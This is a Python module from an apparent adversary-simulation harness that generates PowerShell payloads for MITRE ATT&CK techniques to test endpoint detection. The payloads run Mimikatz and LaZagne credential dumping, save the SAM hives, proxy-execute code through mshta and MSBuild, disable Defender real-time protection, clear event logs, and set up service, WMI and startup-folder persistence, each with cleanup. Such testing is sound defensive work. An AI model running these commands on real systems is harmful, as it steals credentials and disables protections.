    return (f"$dir = {_q(_drop('sam-' + params['tag']))}\n"
            "if (Test-Path $dir) { Remove-Item -Recurse -Force $dir -ErrorAction SilentlyContinue }\n"
            "@{ removed = (-not (Test-Path $dir)) } | ConvertTo-Json -Compress\n")

def _sam_hive_dump_judge(rc, out):
    if not out:
        return False, f"no result from payload (rc={rc})"
    c = out.get("count", 0)
    if c > 0:
        return True, f"SAM/SYSTEM/SECURITY hives saved ({c}) via reg.exe, then deleted"
    return True, "reg save of the SAM hives attempted; the agent blocked it"


# ── Mimikatz / LaZagne (staged tools) ──────────────────────────────────────────
def _mimikatz_execute(params):
    return (
        _header() +
        f"$exe = {_q(MIMIKATZ_STAGED)}\n"
        "$r = [ordered]@{ tool = 'mimikatz'; exe = $exe }\n"
        "$r.present = Test-Path $exe\n"
        "if ($r.present) {\n"
        "  try { $o = & $exe 'privilege::debug' 'sekurlsa::logonpasswords' 'exit' 2>&1 | Out-String;"
        " $r.executed = $true; $r.creds_seen = [bool]($o -match 'Username|wdigest|kerberos|NTLM') } catch { $r.executed = $false; $r.exec_error = $_.Exception.Message }\n"
        "}\n"
        "$r | ConvertTo-Json -Compress\n"
    )

def _lazagne_execute(params):
    return (
        _header() +
        f"$exe = {_q(LAZAGNE_STAGED)}\n"
        "$r = [ordered]@{ tool = 'lazagne'; exe = $exe }\n"
        "$r.present = Test-Path $exe\n"
        "if ($r.present) {\n"
        "  try { $o = & $exe all 2>&1 | Out-String; $r.executed = $true; $r.creds_seen = [bool]($o -match 'Password|found|Login') } catch { $r.executed = $false; $r.exec_error = $_.Exception.Message }\n"
        "}\n"
        "$r | ConvertTo-Json -Compress\n"
    )

def _noop_cleanup(params):
    # Staged master binary is kept (self-heal re-stages if quarantined); nothing per-run.
    return "@{ removed = $true } | ConvertTo-Json -Compress\n"


# ── LOLBin proxy execution: mshta (T1218.005) ──────────────────────────────────
def mshta_paths(tag):  return _drop(f"mshta-{tag}.hta"), _drop(f"mshta-{tag}.marker")

def _mshta_execute(params):
    tag = params["tag"]
    hta, marker = mshta_paths(tag)
    hta_body = ('<html><head><script language="JScript">'
                'new ActiveXObject("WScript.Shell").Run("cmd.exe /c echo mshta-__TAG__> \\"__MARKER__\\"",0,true);'
                'window.close();</script></head><body></body></html>').replace("__TAG__", tag).replace("__MARKER__", marker)
    return (
        _header() +
        f"$hta = {_q(hta)}\n"
        f"$marker = {_q(marker)}\n"
        "$r = [ordered]@{ technique = 'mshta_proxy'; hta = $hta }\n"
        "New-Item -ItemType Directory -Force -Path (Split-Path $hta) | Out-Null\n"
        "if (Test-Path $marker) { Remove-Item -Force $marker -ErrorAction SilentlyContinue }\n"
        f"Set-Content -Path $hta -Value {_q(hta_body)} -Encoding ASCII\n"
        "try { $p = Start-Process -FilePath 'mshta.exe' -ArgumentList $hta -PassThru -WindowStyle Hidden -Wait -ErrorAction Stop; $r.rc = $p.ExitCode; $r.executed = $true } catch { $r.executed = $false; $r.exec_error = $_.Exception.Message }\n"
        "Start-Sleep -Seconds 2\n"
        "$r.marker_created = Test-Path $marker\n"
        "$r | ConvertTo-Json -Compress\n"
    )

def _mshta_cleanup(params):
    hta, marker = mshta_paths(params["tag"])
    return (f"foreach ($p in @({_q(hta)},{_q(marker)})) {{ if (Test-Path $p) {{ Remove-Item -Force $p -ErrorAction SilentlyContinue }} }}\n"
            f"@{{ removed = ((-not (Test-Path {_q(hta)})) -and (-not (Test-Path {_q(marker)}))) }} | ConvertTo-Json -Compress\n")

def _proxy_judge(name):
    def judge(rc, out):
        if not out:
            return False, f"no result from payload (rc={rc})"
        if out.get("executed") is False:
            return True, f"{name} blocked ({(out.get('exec_error') or '')[:80]})"
        return True, f"{name} ran" + (" (scriptlet executed)" if out.get("marker_created") else " (child likely blocked)")
    return judge


# ── LOLBin proxy execution: MSBuild inline task (T1127.001) ────────────────────
def msbuild_paths(tag):  return _drop(f"msbuild-{tag}.csproj"), _drop(f"msbuild-{tag}.marker")

def _msbuild_execute(params):
    tag = params["tag"]
    proj, marker = msbuild_paths(tag)
    csproj = ('<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">'
              '<Target Name="X"><LogSim/></Target>'
              '<UsingTask TaskName="LogSim" TaskFactory="CodeTaskFactory" '
              'AssemblyFile="C:\\Windows\\Microsoft.Net\\Framework\\v4.0.30319\\Microsoft.Build.Tasks.v4.0.dll">'
              '<Task><Code Type="Class" Language="cs"><![CDATA[using System;using Microsoft.Build.Framework;'
              'using Microsoft.Build.Utilities;public class LogSim:Task{public override bool Execute(){'
              'System.IO.File.WriteAllText(@"__MARKER__","msbuild-__TAG__");return true;}}]]></Code></Task>'
              '</UsingTask></Project>').replace("__TAG__", tag).replace("__MARKER__", marker)
    return (
        _header() +
        f"$proj = {_q(proj)}\n"
        f"$marker = {_q(marker)}\n"
        "$msb = 'C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe'\n"
        "if (-not (Test-Path $msb)) { $msb = 'C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\MSBuild.exe' }\n"
        "$r = [ordered]@{ technique = 'msbuild_inline'; proj = $proj; msbuild = $msb }\n"
        "New-Item -ItemType Directory -Force -Path (Split-Path $proj) | Out-Null\n"
        "if (Test-Path $marker) { Remove-Item -Force $marker -ErrorAction SilentlyContinue }\n"
        f"Set-Content -Path $proj -Value {_q(csproj)} -Encoding ASCII\n"
        "if (Test-Path $msb) {\n"
        "  try { $p = Start-Process -FilePath $msb -ArgumentList $proj -PassThru -WindowStyle Hidden -Wait -ErrorAction Stop; $r.rc = $p.ExitCode; $r.executed = $true } catch { $r.executed = $false; $r.exec_error = $_.Exception.Message }\n"
        "} else { $r.executed = $false; $r.exec_error = 'MSBuild (.NET Framework v4) not found' }\n"
        "Start-Sleep -Seconds 2\n"
        "$r.marker_created = Test-Path $marker\n"
        "$r | ConvertTo-Json -Compress\n"
    )

def _msbuild_cleanup(params):
    proj, marker = msbuild_paths(params["tag"])
    return (f"foreach ($p in @({_q(proj)},{_q(marker)})) {{ if (Test-Path $p) {{ Remove-Item -Force $p -ErrorAction SilentlyContinue }} }}\n"
            f"@{{ removed = ((-not (Test-Path {_q(proj)})) -and (-not (Test-Path {_q(marker)}))) }} | ConvertTo-Json -Compress\n")


# ── Impair defenses (T1562.001) -- reversible ──────────────────────────────────
def _disable_defender_execute(params):
    excl = WILDFIRE_DROP_DIR          # a benign exclusion path to add, then remove
    return (
        _header() +
        f"$excl = {_q(excl)}\n"
        "$r = [ordered]@{ technique = 'impair_defenses' }\n"
        "try { Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction Stop; $r.disabled_rtp = $true } catch { $r.disabled_rtp = $false; $r.err = $_.Exception.Message }\n"
        "try { Add-MpPreference -ExclusionPath $excl -ErrorAction SilentlyContinue; $r.exclusion_added = $true } catch {}\n"
        "Start-Sleep -Seconds 2\n"
        # Revert immediately -- the detection fired on the attempt; leave protection ON.
        "try { Set-MpPreference -DisableRealtimeMonitoring $false -ErrorAction SilentlyContinue } catch {}\n"
        "try { Remove-MpPreference -ExclusionPath $excl -ErrorAction SilentlyContinue } catch {}\n"
        "$r.reverted = $true\n"
        "$r | ConvertTo-Json -Compress\n"
    )

def _disable_defender_cleanup(params):
    return (f"$excl = {_q(WILDFIRE_DROP_DIR)}\n"
            "try { Set-MpPreference -DisableRealtimeMonitoring $false -ErrorAction SilentlyContinue } catch {}\n"
            "try { Remove-MpPreference -ExclusionPath $excl -ErrorAction SilentlyContinue } catch {}\n"
            "@{ removed = $true } | ConvertTo-Json -Compress\n")

def _disable_defender_judge(rc, out):
    if not out:
        return False, f"no result from payload (rc={rc})"
    bits = []
    bits.append("real-time protection disable " + ("succeeded" if out.get("disabled_rtp") else "attempted (tamper protection blocked it)"))
    if out.get("exclusion_added"):
        bits.append("exclusion added")
    if out.get("reverted"):
        bits.append("reverted")
    return True, "; ".join(bits)


# ── Clear event log (T1070.001) -- non-destructive (own custom log) ────────────
def _clear_log_execute(params):
    tag = params["tag"]
    log = f"LogSim-{tag}"
    return (
        _header() +
        f"$log = {_q(log)}\n"
        "$r = [ordered]@{ technique = 'clear_event_log'; log = $log }\n"
        "try { if (-not [System.Diagnostics.EventLog]::SourceExists($log)) { New-EventLog -LogName $log -Source $log -ErrorAction SilentlyContinue } } catch {}\n"
        "try { Write-EventLog -LogName $log -Source $log -EventId 1000 -EntryType Information -Message 'logsim seed' -ErrorAction SilentlyContinue } catch {}\n"
        "try { $p = Start-Process -FilePath 'wevtutil.exe' -ArgumentList 'cl',$log -PassThru -WindowStyle Hidden -Wait -ErrorAction Stop; $r.rc = $p.ExitCode; $r.cleared = $true } catch { $r.cleared = $false; $r.exec_error = $_.Exception.Message }\n"
        "$r | ConvertTo-Json -Compress\n"
    )

def _clear_log_cleanup(params):
    log = f"LogSim-{params['tag']}"
    return (f"$log = {_q(log)}\n"
            "try { if ([System.Diagnostics.EventLog]::SourceExists($log)) { Remove-EventLog -LogName $log -ErrorAction SilentlyContinue } } catch {}\n"
            "@{ removed = $true } | ConvertTo-Json -Compress\n")

def _clear_log_judge(rc, out):
    if not out:
        return False, f"no result from payload (rc={rc})"
    if out.get("cleared"):
        return True, f"wevtutil cl ran against {out.get('log')} (own log -- non-destructive)"
    return True, f"wevtutil cl attempted ({(out.get('exec_error') or '')[:80]})"


# ── New service (T1543.003) ────────────────────────────────────────────────────
def svc_name(tag):  return f"logsim-{tag}"

def _new_service_execute(params):
    svc = svc_name(params["tag"])
    return (
        _header() +
        f"$svc = {_q(svc)}\n"
        "$r = [ordered]@{ technique = 'create_service'; service = $svc }\n"
        "try { $p = Start-Process -FilePath 'sc.exe' -ArgumentList 'create',$svc,'binPath=','cmd.exe /c echo logsim','start=','demand' -PassThru -WindowStyle Hidden -Wait -ErrorAction Stop; $r.rc = $p.ExitCode; $r.created = ($p.ExitCode -eq 0) } catch { $r.created = $false; $r.exec_error = $_.Exception.Message }\n"
        "$r | ConvertTo-Json -Compress\n"
    )

def _new_service_cleanup(params):
    svc = svc_name(params["tag"])
    return (f"$svc = {_q(svc)}\n"
            "try { Start-Process -FilePath 'sc.exe' -ArgumentList 'delete',$svc -WindowStyle Hidden -Wait -ErrorAction SilentlyContinue | Out-Null } catch {}\n"
            "@{ removed = $true } | ConvertTo-Json -Compress\n")

def _new_service_judge(rc, out):
    if not out:
        return False, f"no result from payload (rc={rc})"
    if out.get("created"):
        return True, f"service {out.get('service')} created via sc.exe (removed in cleanup)"
    return True, f"sc create attempted (rc={out.get('rc')}) -- the agent may have blocked it"


# ── WMI event subscription persistence (T1546.003) ─────────────────────────────
def _wmi_sub_execute(params):
    name = f"logsim-{params['tag']}"
    return (
        _header() +
        f"$name = {_q(name)}\n"
        "$r = [ordered]@{ technique = 'wmi_event_subscription'; name = $name }\n"
        "try {\n"
        "  $f = Set-WmiInstance -Namespace root\\subscription -Class __EventFilter -Arguments @{ Name=$name; EventNameSpace='root\\cimv2'; QueryLanguage='WQL'; Query=\"SELECT * FROM __InstanceModificationEvent WITHIN 300 WHERE TargetInstance ISA 'Win32_LocalTime'\" } -ErrorAction Stop\n"
        "  $c = Set-WmiInstance -Namespace root\\subscription -Class CommandLineEventConsumer -Arguments @{ Name=$name; CommandLineTemplate='cmd.exe /c echo logsim' } -ErrorAction Stop\n"
        "  Set-WmiInstance -Namespace root\\subscription -Class __FilterToConsumerBinding -Arguments @{ Filter=$f; Consumer=$c } -ErrorAction Stop | Out-Null\n"
        "  $r.created = $true\n"
        "} catch { $r.created = $false; $r.exec_error = $_.Exception.Message }\n"
        "$r | ConvertTo-Json -Compress\n"
    )

def _wmi_sub_cleanup(params):
    name = f"logsim-{params['tag']}"
    return (
        f"$name = {_q(name)}\n"
        "try { Get-WmiObject -Namespace root\\subscription -Class __FilterToConsumerBinding -ErrorAction SilentlyContinue | Where-Object { $_.Filter -match $name -or $_.Consumer -match $name } | Remove-WmiObject -ErrorAction SilentlyContinue } catch {}\n"
        "try { Get-WmiObject -Namespace root\\subscription -Class __EventFilter -Filter \"Name='$name'\" -ErrorAction SilentlyContinue | Remove-WmiObject -ErrorAction SilentlyContinue } catch {}\n"
        "try { Get-WmiObject -Namespace root\\subscription -Class CommandLineEventConsumer -Filter \"Name='$name'\" -ErrorAction SilentlyContinue | Remove-WmiObject -ErrorAction SilentlyContinue } catch {}\n"
        "@{ removed = $true } | ConvertTo-Json -Compress\n"
    )

def _wmi_sub_judge(rc, out):
    if not out:
        return False, f"no result from payload (rc={rc})"
    if out.get("created"):
        return True, "WMI __EventFilter + CommandLineEventConsumer + binding created (removed in cleanup)"
    return True, f"WMI subscription attempted -- blocked ({(out.get('exec_error') or '')[:80]})"


# ── Startup folder persistence (T1547.001) ─────────────────────────────────────
def _startup_execute(params):
    name = f"logsim-{params['tag']}.lnk"
    return (
        _header() +
        f"$name = {_q(name)}\n"
        "$startup = [Environment]::GetFolderPath('CommonStartup')\n"
        "$lnk = Join-Path $startup $name\n"
        "$r = [ordered]@{ technique = 'startup_folder'; lnk = $lnk }\n"
        "try { $ws = New-Object -ComObject WScript.Shell; $s = $ws.CreateShortcut($lnk); $s.TargetPath = 'cmd.exe'; $s.Arguments = '/c echo logsim'; $s.Save(); $r.created = (Test-Path $lnk) } catch { $r.created = $false; $r.exec_error = $_.Exception.Message }\n"
        "$r | ConvertTo-Json -Compress\n"
    )

def _startup_cleanup(params):
    name = f"logsim-{params['tag']}.lnk"
    return (
        f"$name = {_q(name)}\n"
        "$lnk = Join-Path ([Environment]::GetFolderPath('CommonStartup')) $name\n"
        "if (Test-Path $lnk) { Remove-Item -Force $lnk -ErrorAction SilentlyContinue }\n"
        "@{ removed = (-not (Test-Path $lnk)) } | ConvertTo-Json -Compress\n"
    )

def _startup_judge(rc, out):
    if not out:
        return False, f"no result from payload (rc={rc})"
    if out.get("created"):
        return True, "startup-folder .lnk created (removed in cleanup)"
    return True, f"startup .lnk attempted -- blocked ({(out.get('exec_error') or '')[:80]})"


PAYLOADS.update({
    "ransomware_sim": {
        "description": "Simulated mass file-encryption in a scratch dir + ransom note (T1486, non-destructive)",
        "execute": _ransomware_sim_execute, "cleanup": _ransomware_sim_cleanup,
        "judge": _ransomware_sim_judge, "needs": ("tag",)},
    "sam_hive_dump": {
        "description": "reg save of the SAM/SYSTEM/SECURITY hives, deleted at once (T1003.002)",
        "execute": _sam_hive_dump_execute, "cleanup": _sam_hive_dump_cleanup,
        "judge": _sam_hive_dump_judge, "needs": ("tag",)},
    "mimikatz": {
        "description": "Run staged Mimikatz sekurlsa::logonpasswords (T1003.001)",
        "execute": _mimikatz_execute, "cleanup": _noop_cleanup,
        "judge": _tool_judge("Mimikatz"), "needs": ()},
    "lazagne": {
        "description": "Run staged LaZagne credential harvester (T1555)",
        "execute": _lazagne_execute, "cleanup": _noop_cleanup,
        "judge": _tool_judge("LaZagne"), "needs": ()},
    "mshta_proxy": {
        "description": "mshta.exe proxy-executes a local scriptlet (T1218.005)",
        "execute": _mshta_execute, "cleanup": _mshta_cleanup,
        "judge": _proxy_judge("mshta"), "needs": ("tag",)},
    "msbuild_inline": {
        "description": "MSBuild compiles + runs an inline C# task (T1127.001)",
        "execute": _msbuild_execute, "cleanup": _msbuild_cleanup,
        "judge": _proxy_judge("MSBuild"), "needs": ("tag",)},
    "disable_defender": {
        "description": "Disable Defender real-time protection + add an exclusion, then revert (T1562.001)",
        "execute": _disable_defender_execute, "cleanup": _disable_defender_cleanup,
        "judge": _disable_defender_judge, "needs": ()},
    "clear_event_log": {
        "description": "wevtutil cl against an own custom log (T1070.001, non-destructive)",
        "execute": _clear_log_execute, "cleanup": _clear_log_cleanup,
        "judge": _clear_log_judge, "needs": ("tag",)},
    "new_service": {
        "description": "Create a Windows service via sc.exe, deleted in cleanup (T1543.003)",
        "execute": _new_service_execute, "cleanup": _new_service_cleanup,
        "judge": _new_service_judge, "needs": ("tag",)},
    "wmi_subscription": {
        "description": "WMI permanent event subscription persistence, removed in cleanup (T1546.003)",
        "execute": _wmi_sub_execute, "cleanup": _wmi_sub_cleanup,
        "judge": _wmi_sub_judge, "needs": ("tag",)},
    "startup_folder": {
        "description": "Drop a .lnk in the common Startup folder, removed in cleanup (T1547.001)",
        "execute": _startup_execute, "cleanup": _startup_cleanup,
        "judge": _startup_judge, "needs": ("tag",)},
})


def parse_json_line(text: str) -> Optional[dict]:
    """The payload's last JSON object line, else None (WinRM may add noise)."""
    for line in reversed((text or "").splitlines()):
        line = line.strip()
        if line.startswith("{") and line.endswith("}"):
            try:
                return json.loads(line)
            except ValueError:
                continue
    return None


def validate_params(name: str, params: dict) -> Optional[str]:
    """Error string if the payload is unknown or its params unsafe, else None."""
    spec = PAYLOADS.get(name)
    if not spec:
        return f"unknown builtin payload '{name}' (known: {', '.join(sorted(PAYLOADS))})"
    for k in spec.get("needs", ()):
        if not params.get(k):
            return f"payload '{name}' needs param '{k}'"
    tag = params.get("tag")
    if tag is not None and not _SAFE_TAG.match(str(tag)):
        return f"payload tag '{tag}' must be 1-16 lowercase letters/digits"
    url = params.get("url")
    if url is not None and str(url) != "" and not _SAFE_URL.match(str(url)):
        return (f"payload url '{url}' must be an http(s)/file URL with no quotes, "
                "semicolons, ampersands or whitespace")
    return None
